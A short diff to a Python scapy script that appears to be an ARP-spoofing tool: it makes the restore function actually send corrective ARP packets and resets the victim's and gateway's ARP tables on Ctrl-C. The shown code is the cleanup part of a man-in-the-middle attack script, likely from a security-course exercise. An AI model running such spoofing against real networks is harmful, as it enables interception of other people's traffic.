@@ -25,10 +25,7 @@ def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst= destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    print(packet.show())
-    print(packet.summary())
-
-restore(target_ip, gateway_ip)
+    scapy.send(packet, count=4, verbose=False)
 
 try:
     sent_packets_counts = 0
@@ -41,4 +38,7 @@ try:
         time.sleep(2)
         
 except KeyboardInterrupt:
-    print("[+] Detected Keyboard Interupt .... Quiting")
+    print("[+] Detected Keyboard Interupt .... Resetting ARP Tables")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    print("[+] ARP tables are setted back from before")
